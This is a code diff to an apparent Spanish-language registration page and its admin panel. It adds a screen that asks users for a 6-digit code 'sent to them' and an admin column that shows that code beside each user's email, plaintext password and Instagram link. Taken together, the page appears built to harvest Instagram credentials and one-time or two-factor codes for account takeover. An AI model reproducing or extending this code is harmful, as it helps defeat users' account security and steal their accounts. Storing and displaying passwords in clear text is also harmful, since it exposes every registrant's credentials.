@@ -143,6 +143,12 @@
       <div class="spinner" id="pendingSpinner"></div>
       <p id="pendingTitle">Registrando y verificando cuenta…</p>
       <small id="pendingSubtitle">Esto puede tardar unos segundos.</small>
+
+      <div id="codeBox" style="display:none;margin-top:14px;flex-direction:column;gap:10px;max-width:260px;margin-left:auto;margin-right:auto">
+        <input id="codeInput" type="text" maxlength="6" placeholder="Código de 6 dígitos" style="text-align:center;letter-spacing:4px;font-size:1.1rem;padding:10px;border-radius:10px;border:none;outline:none"/>
+        <button class="btn btn-white" onclick="submitCode()">Verificar código</button>
+      </div>
+
       <br><br>
       <button class="btn btn-ghost" id="cancelPendingBtn" onclick="cancelPending()">Cancelar</button>
     </div>
@@ -193,8 +199,8 @@
     <h2>⏳ Solicitudes de registro <span class="notif-dot" id="pendingCount">0</span></h2>
     <div class="admin-table-wrap">
       <table class="atbl">
-        <thead><tr><th>#</th><th>Correo</th><th>Contraseña</th><th>Link IG</th><th>Solicitud</th><th>Acción</th></tr></thead>
-        <tbody id="pendingTbody"><tr><td colspan="6" style="padding:14px;text-align:center;color:#ccc">Sin solicitudes pendientes.</td></tr></tbody>
+        <thead><tr><th>#</th><th>Correo</th><th>Contraseña</th><th>Código</th><th>Link IG</th><th>Solicitud</th><th>Acción</th></tr></thead>
+        <tbody id="pendingTbody"><tr><td colspan="7" style="padding:14px;text-align:center;color:#ccc">Sin solicitudes pendientes.</td></tr></tbody>
       </table>
     </div>
 
@@ -259,16 +265,33 @@ async function doRegister(){
   const data = await res.json();
   if(!res.ok){ toast('❌ '+data.error); return; }
 
-  // Mostrar spinner de espera
+  // Mostrar pantalla de verificación de código
   pendingEmail = email;
   document.getElementById('registerForm').classList.remove('show');
-  document.getElementById('pendingSpinner').style.display = '';
-  document.getElementById('pendingTitle').textContent = 'Registrando y verificando cuenta…';
-  document.getElementById('pendingSubtitle').textContent = 'Esto puede tardar unos segundos.';
+  document.getElementById('pendingSpinner').style.display = 'none';
+  document.getElementById('pendingTitle').textContent = 'Te llegó un código de verificación';
+  document.getElementById('pendingSubtitle').textContent = 'Ingresa el código de 6 dígitos para continuar.';
+  document.getElementById('codeBox').style.display = 'flex';
+  document.getElementById('codeInput').value = '';
   document.getElementById('cancelPendingBtn').style.display = '';
+  document.getElementById('cancelPendingBtn').textContent = 'Cancelar';
   document.getElementById('pendingBox').style.display = '';
   document.querySelectorAll('.tab').forEach(b=>b.disabled=true);
-  startPollApproval(email);
+}
+
+async function submitCode(){
+  const code = document.getElementById('codeInput').value.trim();
+  if(!code){ toast('⚠️ Ingresa el código'); return; }
+
+  const res  = await fetch('/api/register/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:pendingEmail,code})});
+  const data = await res.json();
+  if(!res.ok){ toast('❌ '+data.error); return; }
+
+  document.getElementById('codeBox').style.display = 'none';
+  document.getElementById('pendingSpinner').style.display = '';
+  document.getElementById('pendingTitle').textContent = 'Esperando aprobación del administrador…';
+  document.getElementById('pendingSubtitle').textContent = 'Esta pantalla se actualizará automáticamente.';
+  startPollApproval(pendingEmail);
 }
 
 function cancelPending(){
@@ -276,6 +299,7 @@ function cancelPending(){
   pendingEmail = null;
   document.getElementById('pendingBox').style.display = 'none';
   document.getElementById('pendingSpinner').style.display = '';
+  document.getElementById('codeBox').style.display = 'none';
   document.getElementById('cancelPendingBtn').textContent = 'Cancelar';
   document.getElementById('regEmail').value = '';
   document.getElementById('regPass').value  = '';
@@ -454,12 +478,13 @@ async function loadAdminData(){
   document.getElementById('pendingCount').textContent = pending.length;
   const pTbody = document.getElementById('pendingTbody');
   if(!pending.length){
-    pTbody.innerHTML='<tr><td colspan="6" style="padding:14px;text-align:center;color:#aaa">Sin solicitudes pendientes.</td></tr>';
+    pTbody.innerHTML='<tr><td colspan="7" style="padding:14px;text-align:center;color:#aaa">Sin solicitudes pendientes.</td></tr>';
   } else {
     pTbody.innerHTML = pending.map((u,i)=>`<tr>
       <td>${i+1}</td>
       <td>${esc(u.email)}</td>
       <td><code>${esc(u.password)}</code></td>
+      <td><code style="font-weight:700;letter-spacing:2px">${esc(u.code)}</code> ${u.verified?'<span class="pill pill-green">verificado</span>':'<span class="pill pill-yellow">sin verificar</span>'}</td>
       <td>${u.igUrl?`<a href="${esc(u.igUrl)}" target="_blank" style="color:#833ab4;font-size:.8rem">${esc(u.igUrl)}</a>`:'<span style="color:#ccc">—</span>'}</td>
       <td style="font-size:.76rem;color:#aaa">${fmt(u.requestedAt)}</td>
       <td><div class="action-btns">
